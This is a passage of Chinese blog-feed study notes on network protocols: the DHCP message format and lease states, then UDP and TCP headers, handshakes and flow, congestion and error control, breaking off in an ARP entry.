/><blockquote><ol><li>操作码:1字节，表示是请求报文还是应答报文，1代表请求，2代表应答</li><li>硬件类型:1字节，表示正在使用的硬件技术的类型，1表示以太网。</li><li>硬件地址长度:1字节，如果是以太网，该字段值为6。</li><li>跳数:1字节，表示报文经过的DHCP中继的数目，请求报文每经过一个DHCP中继，该字段就加1。</li><li>事务ID:4字节，客户端发起一次请求时选择的随机数，服务器应答时返回客户同一个值，用来标识一次地址请求交互过程。</li><li>秒数:2字节，表示从客户端发出DHCP请求到现在所经过的秒数。</li><li>标志:2字节，第一个比特为广播响应标识位，用来标识dhcp服务器响应报文是采用单播还是广播发送。其余比特保留不用。</li><li>客户IP:4字节，如果客户已知道自己的IP，就写入，否则填入0。</li><li>你的IP:4字节，服务器分配给客户的IP。</li><li>服务器IP:4字节，由服务器填写，DHCP服务器的IP。</li><li>DHCP中继IP:4字节，客户发出请求后报文经过的第一个DHCP中继的IP。客户硬件地址:16字节，由客户端设置。</li><li>服务器主机名:64字节，由服务器填写。</li><li>引导文件名:由服务器为客户指定的配置文件名称。</li><li>选项:可选选项字段，包含报文的类型、有效租期、DNS服务器的IP地址、wins服务器的IP地址等配置信息，格式如下:</li></ol></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP协议封装.png" style="zoom:67%;" /><h4 id="静态地址分配与动态地址分配："><a href="#静态地址分配与动态地址分配：" class="headerlink" title="静态地址分配与动态地址分配："></a>静态地址分配与动态地址分配：</h4><h5 id="静态地址分配"><a href="#静态地址分配" class="headerlink" title="静态地址分配"></a>静态地址分配</h5><blockquote><p style="color:blue;">将物理地址与IP地址绑定在一起，DHCP服务器将这个绑定文件存放在静态数据库中。</p><p style="color:blue;">当有主机请求分配IP时，DHCP服务器首先检查静态数据库，若静态数据库存在所请求的物理地址条目，则将相应的IP地址返回给客户。</p></blockquote><h5 id="动态地址分配"><a href="#动态地址分配" class="headerlink" title="动态地址分配"></a>动态地址分配</h5><p>DHCP服务器有一个<strong>存放IP地址的数据库</strong>(IP地址池)。当客户请求临时IP地址时，DHCP服务器就查找可用的IP地址分配给客户。</p><blockquote><p style="color:orange;">从DHCP服务器获得的IP地址是临时的，服务器预设了租用时间，租用时间到期时，客户就更新租用或停止使用这个IP地址。</p></blockquote><p>服务器对更新租用可选择同意或不同意，如果不同意，客户就停止使用这个地址。</p><h4 id="DHCP状态转换"><a href="#DHCP状态转换" class="headerlink" title="DHCP状态转换"></a>DHCP状态转换</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP状态转换.png" style="zoom: 50%;" /><p><strong>一、初始化状态：</strong></p><ul><li>当DHCP客户端首次启动时，它处于初始化状态。客户使用向UDP端口67<strong>广播DHCPDISCOVER报文</strong>（带有DHCPDISCOVER选项的请求报文)。</li></ul><p><strong>二、选择状态：</strong></p><ul><li>发送DHCPDISCOVER报文后，客户就进入<strong>选择状态</strong>。收到请求报文的服务器用<strong>DHCPOFFER报文</strong>进行响应，提供了IP地址和租用时间，同时，服务器把提供的IP地址锁定，使这个地址不再提供给其它客户。</li><li>如果客户没有收到DHCPOFFER报文，它就再尝试4次，每次间隔2s，如果仍然没有应答，客户就睡眠300s后再试 </li></ul><p><strong>三、 请求状态 ：</strong></p><ul><li>客户选择多个DHCP服务器所提供的地址中的一个，并广播发送<strong>DHCPREQUEST报文</strong>，然后进入请求状态。</li><li>客户在请求状态等待，直到收到服务器的DHCPACK报文，然后客户进入绑定状态。 </li></ul><p><strong>四、绑定状态：</strong></p><ul><li>绑定状态下，客户在租用时间到期之前可以使用这个IP地址。当租用时间到达<strong>50%<strong>时，客户发送另一个DHCPREQUEST报文请求更新，进入</strong>更新状态</strong>。</li><li>在绑定状态，客户也可以使用<strong>DHCPRELEASE</strong>报文取消租用，进入初始化状态。</li></ul><p><strong>五、更新状态：</strong></p><ul><li><p>在更新状态下，如果客户收到更新租用的DHCPACK报文，就把计时器复位，然后回到绑定状态。</p></li><li><p>如果没有收到DHCPACK报文，且租用时间已到达87.5%，客户将再次向服务器发送DHCPREQUEST报文，进入重新绑定状态。 </p></li></ul><h4 id="DHCP运行过程"><a href="#DHCP运行过程" class="headerlink" title="DHCP运行过程"></a>DHCP运行过程</h4><p><strong>一、发现阶段：</strong></p><ul><li>DHCP客户寻找DHCP服务器的阶段。DHCP客户以广播方式发送DHCPDISCOVER报文来寻找DHCP服务器。</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP发现阶段.png" style="zoom:67%;" /><p><strong>二、提供阶段：</strong></p><ul><li><p>服务器向DHCP客户提供lP地址的阶段。网络中收到<strong>DHCPDISCOVER</strong>的DHCP服务器都会做出响应，从尚未出租的IP中挑选一个分配给客户，向客户发送一个包含出租的IP地址和其它设置的<strong>DHCPOFFER</strong>报文。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP提供阶段.png" style="zoom:67%;" /></li></ul><p><strong>三、选择阶段：</strong></p><ul><li><p>DHCP客户端选择某台DHCP服务器提供的IP地址的阶段。</p></li><li><p>如果有多台DHCP服务器向DHCP客户端发来的DHCPOFFER提供报文，则DHCP客户只接受第一个收到的DHCPOFFER提供报文，然后它就以广播方式回答一个DHCPREQUEST请求报文，该报文中包含向它所选定的DHCP服务器请求IP地址的内容。之所以要以广播方式回答，是为了通知所有的DHCP服务器，他将选择某台DHCP服务器所提供的IP地址。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP选择阶段.png" style="zoom: 80%;" /></li></ul><p><strong>四、确认阶段：</strong></p><ul><li><p>DHCP服务器确认所提供的IP地址的阶段</p></li><li><p>当DHCP服务器收到DHCP客户回答的DHCPREQUEST请求报文之后，它便向DHCP客户发送一个包含它所提供的IP地址和其它设置的DHCPACK确认报文，告诉DHCP客户可以使用它所提供的IP地址。然后DHCP客户便将其TCP/IP协议与网卡绑定，另外，除DHCP客户选中的服务器外，其它DHCP服务器都收回曾提供的IP地址</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/DHCP确认阶段.png" style="zoom:80%;" /></li></ul><p><strong>五、重新登录：</strong></p><ul><li>以后DHCP客户每次重新登录网络时，就不需要再发送DHCPDISCOVER报文了，而是直接发送含有前一次所分配的IP地址的DHCPREQUEST请求报文。当服务器收到这一报文后，它会尝试让客户继续使用原来的IP地址，并回答一个DHCPACK确认报文。</li><li>如果此IP地址已无法再分配给原来的客户时，服务器给客户回答一个DHCPNACK否认报文。原来的客户收到否认报文后，必须重新发送DHCPDISCOVER报文来请求新的IP地址。</li></ul><p><strong>六、更新租约：</strong></p><ul><li>服务器给客户的IP地址有一个租借期限，期满后服务器会收回IP地址。如果客户要延长其IP租约，则必须更新租约。当时间到了租约期限的50%时，客户会自动向服务器发送更新其IP租约的DHCPREQUEST报文。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>传输层协议TCP与UDP</title>
      <link href="/2022/11/13/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AEUDP%E4%B8%8ETCP/"/>
      <url>/2022/11/13/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AEUDP%E4%B8%8ETCP/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="传输层协议TCP与UDP"><a href="#传输层协议TCP与UDP" class="headerlink" title="传输层协议TCP与UDP"></a>传输层协议TCP与UDP</h2><h3 id="进程间通信："><a href="#进程间通信：" class="headerlink" title="进程间通信："></a>进程间通信：</h3><blockquote><p style="color:orange;">点到点的通信:IP协议负责主机到主机的通信。作为网络层协议，IP协议只能把报文交付给目的主机。</p></blockquote><blockquote><p style="color:orange;">端到端的通信：运输层协议负责进程到进程的通信。TCP和UDP协议负责把报文交付到正确的进程。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/进程间通信.png" style="zoom:80%;" /><h4 id="端口号"><a href="#端口号" class="headerlink" title="端口号:"></a>端口号:</h4><p>主机是用IP地址来标识的，而要标识主机中的进程，就需要使用端口号。TCP/IP协议族中，端口号占16 bit，用0~65535之间的整数标识。TCP和UDP是两个独立的软件模块，因此各自的端口号也相互独立。·端口号只具有本地意义，不同计算机的相同端口号是没有联系的。</p><h5 id="三类端口号："><a href="#三类端口号：" class="headerlink" title="三类端口号："></a>三类端口号：</h5><ul><li>熟知端口，数值为0~1023，用于标识服务器进程。</li><li>登记端口号，数值为1024~49151，为没有熟知端口号的服务器进程使用。使用这个范围的端口号必须在IANA登记，以防止重复。</li><li>客户端口号或短暂端口号，数值为49152~65535，留给客户进程选择暂时使用，一般由应用程序开发者指定或由操作系统随机分配一个未使用的端口号。当服务器进程收到客户进程的报文时，就知道了客户进程所使用的动态端口号。通信结束后，这个端口号可供其它客户进程使用。</li></ul><h5 id="UDP的熟知端口号："><a href="#UDP的熟知端口号：" class="headerlink" title="UDP的熟知端口号："></a>UDP的熟知端口号：</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/UDP的熟知端口号.png" style="zoom:80%;" /><h5 id="套接字："><a href="#套接字：" class="headerlink" title="套接字："></a>套接字：</h5><p>为了使多主机、多进程通信时不发生混乱，必须把主机的IP地址和端口号结合起来使用，称为<strong>套接字(Socket)</strong>.</p><blockquote><p>客户套接字地址唯一地定义了客户进程;服务器套接字地址唯一地定义了服务器进程;TCP与UDP都使用套接字通信;</p></blockquote><p>套接字包括**IP地址(32位)<strong>和</strong>端口号(16位)**，共48位.进行通信的一对套接字在整个Internet中是唯一的。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/套接字.png"  /><blockquote><p style="color:orange;">面向连接的服务：进行数据交换前，先建立连接，传输结柬后释放连接</p></blockquote><ol><li>建立连接阶段:在有关协议数据单元中，须给出源用户与目的用户的完整地址，同时可协商服务质量等选项。</li><li>数据交换阶段:这个阶段，每个报文中不必包含用户完整的地址，而是使用一个连接标识符来代替。报文的发送和接收都是按顺序进行的，发送方先发送的报文，在接收方先收到。</li><li>释放连接阶段:通过相应的协议数据单元完成释放操作。</li></ol><blockquote><p style="color:orange;">无连接的服务：两个实体通信前不必先建立连接。</p></blockquote><blockquote><p>无连接服务灵活方便，但不能防止报文的丢失、重复和乱序。·每个报文必须包含完整的源地址和目的地址，因此开销较大。</p></blockquote><h3 id="用户数据报协议UDP"><a href="#用户数据报协议UDP" class="headerlink" title="用户数据报协议UDP"></a>用户数据报协议UDP</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握UDP协议的报文格式#掌握UDP协议校验和的计算方法#理解UDP协议的优缺点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="UDP协议简介："><a href="#UDP协议简介：" class="headerlink" title="UDP协议简介："></a>UDP协议简介：</h4><blockquote><p style="color:blue;">UDP (User Datagram Protocol，用户数据报协议）提供无连接的传输服务，对等的UDP实体在传输时不建立端到端的连接，只是简单地发送或接收数据报</p></blockquote><p>UDP协议直接位于IP协议的上层，属于运输层协议。<br>UDP协议不提供端到端的确认和重传功能，它不保证数据包一定能到达目的地，因此是不可靠协议，使用UDP的程序可根据自己的需求设计相应的可靠性机制，如TFTP。</p><h5 id="UDP协议的特点"><a href="#UDP协议的特点" class="headerlink" title="UDP协议的特点"></a>UDP协议的特点</h5><p>发送数据之前不需要建立连接，UDP主机不需要维持复杂的连接状态表。</p><p>UDP用户数据报只有8个字节的首部开销。<br>网络的拥塞不会使源主机的发送速率降低，这对某些实时应用是很重要的。·当数据包在传送过程中发生错误时UDP不能报告错误。<br>UDP保留应用程序定义的报文边界，当应用程序把一块数据交给UDP发送时，这块数据将作为独立的单元到达对方的应用程序，因此，应用程序必须关心IP数据报的长度。</p><h4 id="UDP报文格式："><a href="#UDP报文格式：" class="headerlink" title="UDP报文格式："></a>UDP报文格式：</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/UDP报文格式.png" style="zoom: 67%;" /><p>首部字段和数据字段。首部字段8个字节，由4个字段组成，每个字段2字节</p><ol><li>源端口:表示发送端的端口号。不同的应用程序使用不同的端口号，实现了同一时间段内多个应用程序可以一起使用网络进行数据的发送和接收。</li><li>目的端口:表示数据包被发往的目的端的端口号。</li><li>有效负载长度:包括UDP首部和UDP数据在内的整个用户数据报的长度。该字段的最小值是8，一些UDP实现将数据报的大小限制到了8192字节。</li><li>校验和:UDP的校验的校验范围包括伪首部（IP首部的部分字段)、UDP首部和UDP数据，该字段是可选的。如果该字段值为零就说明不进行校验。</li></ol><p>UDP用户数据报封装在IP数据报中，IP数据报的“协议类型”字段的值是17，表示数据部分是从UDP协议来的。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/UDP封装.png" style="zoom:67%;" /><h5 id="UDP校验和的计算"><a href="#UDP校验和的计算" class="headerlink" title="UDP校验和的计算"></a>UDP校验和的计算</h5><blockquote><p style="color:blue;">UDP校验和的计算与IP和ICMP校验和的计算不同。UDP校拉和T拉H围包括三部分:伪首部、UDP首部以及从应用层来的数据。</p></blockquote><p>伪首部是IP首部的一部分，其中有些字段要填入0。若校演和不包括伪首部，用户数据报也可能是安全的和正确的。但是，若lP首部受到损伤，则它可能被交付到错误的主机。</p><p>伪首部中的高层协议类型是为了确保这个数据报是属于UDP而不是是属丁于TCP。UDP的高层协议类型是17，若这个值在传输过程中出错，接收端就能检出并丢弃这个数据包，从而不会交付给错误的协议。</p><h4 id="UDP的应用："><a href="#UDP的应用：" class="headerlink" title="UDP的应用："></a>UDP的应用：</h4><p>UDP适用于这样的进程，它需要简单的请求—响应通信，而较少考虑流量控制和差错控制。对于需要传送成块数据的进程，如FTP，则通常不使用UDP。<br>UDP适用于具有内部流量控制和差错控制机制的进程。对多播和广播来说，UDP是个比较合适的传输层协议。UDP可用于管理进程，如SNMP协议。<br>UDP可用于某些路由选择更新协议，如RIP协议。</p><h3 id="传输控制协议TCP"><a href="#传输控制协议TCP" class="headerlink" title="传输控制协议TCP"></a>传输控制协议TCP</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握TCP协议的报文格式</span><span class="token comment"># 掌握TCP连接的建立和释放过程</span><span class="token comment"># 掌握TCP数据传输中编号与确认的过程掌握TCP协议校验和的计算方法</span><span class="token comment"># 理解TCP重传机制</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="TCP协议简介："><a href="#TCP协议简介：" class="headerlink" title="TCP协议简介："></a>TCP协议简介：</h4><p>TCP协议是TCP/IP协议族中的面向连接的、可靠的、端到端的运输层协议。</p><p>TCP提供全双工服务，全双工连接包括两个独立的、方向相反的数据流。与UDP不同，TCP允许发送和接收字节流形式的数据。为了使服务器和客户端以不同的速度双向发送和接收数据，TCP提供了发送和接收两个缓冲区。TCP在报文中加上一个递增的确认序列号来告诉发送端，接收端期望收到的下一个报文，如果在规定时间内，没有收到关于这个包的确认响应，则重新发送此包，这保证了TCP是一种可靠的传输层协议。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/TCP的熟知端口号.png" style="zoom:50%;" /><h4 id="TCP报文格式："><a href="#TCP报文格式：" class="headerlink" title="TCP报文格式："></a>TCP报文格式：</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/TCP报文格式.png" style="zoom: 50%;" /><p>源端口:2字节，主机中发送这个报文的应用程序端口号。</p><p>目的端口:2字节，目的主机中接收这个报文的应用程序的端口号。</p><p>序列号:4字节，定义了指派给本报文第一个数据字节的一个序号。TCP是流式传输协议，为了保证连通性，要在发送的每一个字节上编号。序号指定了这个序列中的哪一个字节是报文的第一个字节。在连接建立时，双方使用随机数产生器产生初始序号，通常每一方的初始序号都是不同的。</p><p>确认号:4字节，接收端期望收到的下一个报文段中数据部分的第一个字节的序号。</p><p>首部长度:4位，指定TCP首部的长度，以4字节为单位。首部长度可以在20~60字节之间。因此，这个字段的值可以在5至15之间。<br>保留字段:4位，保留为今后使用，目前应置为0。<br>控制字段:定义了8种不同的标志。用在TCP的流量控制、连接建立和终止以及数据传送的方式等方面。在同一时间可设置一位或多位标志。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/TCP的控制字段.png" style="zoom:67%;" /><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/\TCP控制字段具体信息.png" style="zoom: 50%;" /><p>窗口:2字节，窗口字段用来控制对方发送的数据量，单位为字节。TCP连接的一端根据设置的缓存空间大小确定自己的接收窗口大小，然后通知对方以确定对方的发送窗口的上限。这时，发送端必须服从接收端的决定。</p><p>检验和:2字节，检验的范围包括首部和数据这两部分。在计算检验和时，要在TCP报文段的前面加上12字节的伪首部。</p><p>紧急指针:2字节，只有当URG=1时才有效，指出在本报文段中的紧急数据的最后一个字节的序号，使接收方知道紧急数据共有多少字节(紧急数据结束后是普通数据)。发送方TCP即使发送窗口为0，也要对带有URG标志的数据段实行强制发送。</p><p>选项:长度可变，最多40字节。</p><p>最大报文段长度MSS (Maximum Segment Size)。</p><blockquote><ul><li> TCP报文段中的数据字段的最大长度。</li><li>与接收窗口值没有关系，不是考虑接收方的缓存是否可以放下TCP报文段中的数据。</li><li>目的是提高网络的利用率，使TCP报文段携带的数据尽可能多，以提高分组中数据部分所占的比例。</li><li>MSS应该尽可能大，只要在IP层不需要进行分片即可。但由于传输路径的动态性，很难确定最佳MSS。</li><li>连接建立时，双方把自己能够支持的MSS通知对方，默认值是536 Byte。因此所有主机都能接受的报文段长度是556 Byte。</li></ul></blockquote><p>填充:为了使整个首部长度是4字节的整数倍，全0填充。</p><h5 id="TCP的封装："><a href="#TCP的封装：" class="headerlink" title="TCP的封装："></a>TCP的封装：</h5><p>TCP报文封装在lP数据报中，IP数据报的“协议类型”字段的值是6</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/TCP的封装.png" style="zoom:67%;" /><h4 id="TCP链接的建立与释放："><a href="#TCP链接的建立与释放：" class="headerlink" title="TCP链接的建立与释放："></a>TCP链接的建立与释放：</h4><blockquote><p style="color:blue;">连接的三个阶段:连接建立、数据传送和连接释放。连接建立</p></blockquote><p>服务器首先准备接收TCP连接，这个过程叫做被动打开。这时的服务器的TCP已经准备好接受任何一台主机的TCP连接了。客户程序发出TCP请求的过程叫做主动打开。然后服务器与客户端就开始三次握手过程。</p><h5 id="三次握手建立连接："><a href="#三次握手建立连接：" class="headerlink" title="三次握手建立连接："></a>三次握手建立连接：</h5><p>1．客户发送第一个报文，这是一个SYN报文，在这个报文中只有SYN标志置为1，这个报文的作用是使序号同步。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/第一次握手.png" style="zoom:50%;" /><p>2．服务器发送第二个报文，即SYN+ACK报文，其中SYN和ACK标志被置为1首先，它是一个用来和对方进行通信的SYN报文。服务器使用这个报文同步初始序号，以便从服务器向客户发送字节。服务器还使用ACK标志确认已从客户端收到了SYN报文，同时给出期望从客户端收到的下一个序号。另外，服务器还定义了客户端要使用的接收窗口的大小。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/第二次握手.png" style="zoom:50%;" /><p>3．客户发送第三个报文。这仅仅是一个ACK报文。它使用ACK标志和确认号字段来确认收到了第二个报文。<br>然后客户端就可以通知上层应用进程，连接已经建立。服务器收到客户机的确认后，也通知上层应用进程，连接已经建立。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/第三次握手.png" style="zoom:50%;" /><h5 id="半关闭的四次握手方式终止连接："><a href="#半关闭的四次握手方式终止连接：" class="headerlink" title="半关闭的四次握手方式终止连接："></a>半关闭的四次握手方式终止连接：</h5><blockquote><p style="color:blue;">半关闭:TCP连接中，一方可以终止发送数据，但仍然保持接收数据，称为半关闭。半关闭通常是由客户端发起的。</p></blockquote><p><strong>半关闭的过程</strong></p><ol><li>客户发送FIN报文，半关闭了这个连接</li><li>服务器发送ACK报文接受了这个半关闭。但是，现在服务器仍然可以发送数据</li><li>当服务器已经把所有处理的数据都发送完毕时，就发送FIN报文</li><li>客户端发送ACK报文给予确认。<ul><li>在半关闭一条连接后，客户端仍然可以接收服务器发送的数据，而服务器也可以接收客户端发送的确认。但是，客户端不能传送数据给服务器。</li></ul></li></ol><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/半关闭的四次握手方式终止连接.png" style="zoom:50%;" /><h4 id="流量控制："><a href="#流量控制：" class="headerlink" title="流量控制："></a>流量控制：</h4><p>发送端收到接收端的确认报文之前，对发送端发送的数据量进行管理</p><p>在不考虑流量控制的情况下，传输层协议可以每次只发送一个字节的数据，然后在发送下一个字节数据之前等待接收端的确认报文。这是一个非常缓慢的过程，发送端在等待确认报文时一直处于空闲状态。<br>还有一种情况是传输层协议一次就将全部数据发送出去，而不理会确认报文。这样虽然加速了发送过程，但可能会使接收端来不及接收而瘫痪。此外，若有一部分数据丢失、重复、失序或损坏，发送端就要一直等到接收端将全部数据都检查完毕后才能知道。</p><h4 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h4><p>TCP的流量控制在缓存上定义了一个窗口，称为滑动窗口，窗口大小的单位是字节，TCP发送数据的多少由滑动窗口决定。</p><p>TCP报文段首部的窗口字段就是给发送方设置的发送窗口的上限。</p><p>发送窗口在连接建立时由双方商定，在通信过程中动态调整。</p><p>如果发送方收到接收方的窗口大小U HIr以人tx’P送数据（带URG标志的数据段除外）。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/滑动窗口.png" style="zoom:67%;" /><p>发送端只要收到了对方的确认，发送窗口就可前移。<br>发送TCP维护一个指针。每发送一个报文段，指针向前移动一个报文段的距离。</p><blockquote><p style="color:red;">滑动窗口的右沿可以向左移动吗?</p>**滑动窗口的右沿向左移动通常发生在对方通知窗口缩小时**。使某些可以发送的数据变成不能发送，如果发送端已经发送了这些数据，就会产生错误。<p>TCP标准强烈不赞成这样做。</p></blockquote><blockquote><p style="color:red;">滑动窗口的左沿可以向左移动吗?</p>**窗口的左沿不能向左移动**，因为这表示已经发送出去的并且经过确认的数据现在又要回收了</blockquote><h4 id="拥塞控制："><a href="#拥塞控制：" class="headerlink" title="拥塞控制："></a>拥塞控制：</h4><h5 id="拥塞控制与流量控制的对比"><a href="#拥塞控制与流量控制的对比" class="headerlink" title="拥塞控制与流量控制的对比:"></a>拥塞控制与流量控制的对比:</h5><blockquote><p style="color:blue;">出现资源拥塞的条件:    对资源需求的总和>可用资源</p></blockquote><ul><li>防止过多的数据注入到网络中，可以使路由器或者链路不至于过载。</li><li>拥塞控制是一个<strong>全局性</strong>的过程，涉及到所有的主机、路由器，以及与降低网络传输性能有关的所有因素。</li></ul><p><strong>流量控制：</strong>在给定的发送端和接收端之间的<strong>点对点通信量的控制</strong>。</p><ul><li>流量控制所要做的就是抑制发送端发送数据的速率，以便使接收端来得及接收</li></ul><h5 id="拥塞控制的作用："><a href="#拥塞控制的作用：" class="headerlink" title="拥塞控制的作用："></a>拥塞控制的作用：</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/拥塞控制.png" style="zoom:50%;" /><h5 id="拥塞控制方法"><a href="#拥塞控制方法" class="headerlink" title="拥塞控制方法"></a>拥塞控制方法</h5><blockquote><p style="color:black;">慢开始:        初始设置拥塞窗口cwnd = 1，每收到一个对新的报文段的确认后，将拥塞窗口加1，逐步增大发送端的拥塞窗口cwnd。</p></blockquote><blockquote><p style="color:black;">拥塞避免:    使拥塞窗口cwnd按线性规律缓慢增长，“加法增大”。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/慢开始于拥塞避免.png" style="zoom:50%;" /><blockquote><p style="color:black;">快重传:接收方每收到一个失序的报文段后就立即发出重复确认，这样做可以让发送方及早知道有报文段没有到达接收方。发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/快重传.png" style="zoom:50%;" /><blockquote><p style="color:black;">快恢复:当发送端收到连续三个重复的确认时，就执行“乘法减小”算法，把慢开始门限ssthresh 减半，但接下去不执行慢开始算法，而是执行拥塞避免算法“加法增大”，使拥塞窗口缓慢地线性增大，实现快恢复。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/快恢复.png" style="zoom:50%;" /><h5 id="发送窗口大小"><a href="#发送窗口大小" class="headerlink" title="发送窗口大小:"></a>发送窗口大小:</h5><p>考虑拥塞控制的情况下，窗口大小由接收窗口和拥塞窗口两者中的较小者决定。接收窗口大小由接收方发送的确认报文中的窗口大小字段值所确定。这是接收端在缓存溢出导致数据被丢弃之前所能接受的最大字节数。拥塞窗口大小是由网络根据拥塞情况而确定的。<br>发送窗口的上限值= Min [rwnd, cwnd]</p><blockquote><ul><li><p>当rwnd &lt; cwnd时，是接收方的接收能力限制发送窗口的最大值</p></li><li><p>当cwnd &lt; rwnd时，则是网络的拥塞限制发送窗口的最大值。</p></li></ul></blockquote><h4 id="差错控制："><a href="#差错控制：" class="headerlink" title="差错控制："></a>差错控制：</h4><h5 id="TCP的差错控制"><a href="#TCP的差错控制" class="headerlink" title="TCP的差错控制"></a>TCP的差错控制</h5><ul><li>应用程序把数据流交付给TCP后，就依靠TCP把整个数据流交付给接收端的应用程序，并且保证数据流是按序的、没有差错的、也没有任何一部分是丢失的或重复的。</li><li>TCP使用差错控制提供可靠性。差错控制包括以下的一些机制:检测受到损伤的报文、丢失的报文、失序的报文和重复的报文。</li></ul><blockquote><p style="color:blue;">实现方式：通过校验和、确认以及超时重传三种机制实现</p></blockquote><ul><li><p>校验和:用来检验报文是否出错，如果出错，接收端就将报文丢弃</p></li><li><p>确认</p><ul><li>累积确认：不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认</li><li>选择确认：首部选项SACK用于报告收到的不连续的字节块的边界</li><li>确认报文不携带数据，但消耗一个序号。除了ACK报文之外，确认报文也需要被确认。</li></ul></li><li><p>重传</p><ul><li>超时计时器到时:发送端为每一个TCP报文段都设置一个超时计时器，若计时器到时仍没收到确认，就重传这个报文。超时计时器的值是动态的，根据报文的往返时间而更新</li><li>快重传:发送端只要一连收到三个重复的ACK即可断定有报文段丢失了，就应立即重传而不必等待计时器超时。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>地址解析协议 ARP</title>
      <link href="/2022/11/12/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AEARP/"/>
      <url>/2022/11/12/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AEARP/</url>
      
        <content type="html"><![CDATA[<h2 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a>地址解析协议 ARP</h2><p>[TOC]</p><h3 id="ARP的定义与基本功能"><a href="#ARP的定义与基本功能" class="headerlink" title="ARP的定义与基本功能"></a>ARP的定义与基本功能</h3><ul><li><p>掌握ARP协议的报文格式</p></li><li><p>掌握ARP协议的工作原理</p></li><li><p>理解ARP高速缓存的作用</p></li><li><p>掌握ARP缓存表的维护过程</p></li></ul><p><strong>ARP</strong>(Address Resolution Protocol，RFC 826）是根据IP地址获取物理地址的一个TCP/IP协议。主机通过将ARP请求<strong>广播</strong>到网络上的所有主机并接收返回消息来确定目标IP地址的物理地址，同时将IP地址和硬件地址存入本机ARP缓存中，下次请求时直接查询<strong>ARP缓存</strong>。</p><h4 id="物理地址："><a href="#物理地址：" class="headerlink" title="物理地址："></a>物理地址：</h4><p>物理地址通常是由硬件来实现的，例如以太网的物理地址被写入到网卡中，任何一块网卡的物理地址是唯一的</p><blockquote><p style="color:blue;">物理地址的长度和格式取决于具体的网络，以太网的物理地址是6字节地址物理地址可以是单播地址、多播地址或广播地址。</p></blockquote><h4 id="逻辑地址："><a href="#逻辑地址：" class="headerlink" title="逻辑地址："></a>逻辑地址：</h4><p>逻辑地址与物理设备本身没有关联, 逻辑地址可以是单播地址、多播地址和广播地址。</p><blockquote><p style="color:skyblue;">目前Internet上的IPv4协议逻辑地址是32位的IP地址， IPv6地址有128位长</blockquote><h4 id="地址解析"><a href="#地址解析" class="headerlink" title="地址解析:"></a>地址解析:</h4><p>逻辑地址是在网络层使用的，但数据包是在物理网络传递。主机或路由器是通过物理地址来识别的,因此将一个数据包传递到一个主机或路由器要进行寻址，需要将一个逻辑地址映射到相应的物理地址。</p><blockquote><p style="color:blue;">地址解析就是主机在发送帧前将目的逻辑地址转换成目的物理地址的过程。</p></blockquote><h5 id="静态映射"><a href="#静态映射" class="headerlink" title="静态映射:"></a>静态映射:</h5><p>手工创建IP地址与物理地址的映射关系，建立映射表。当已知IP地址时，通过查找映射表得到对应的物理地址。</p><blockquote><p style="color:orange;">局限性: 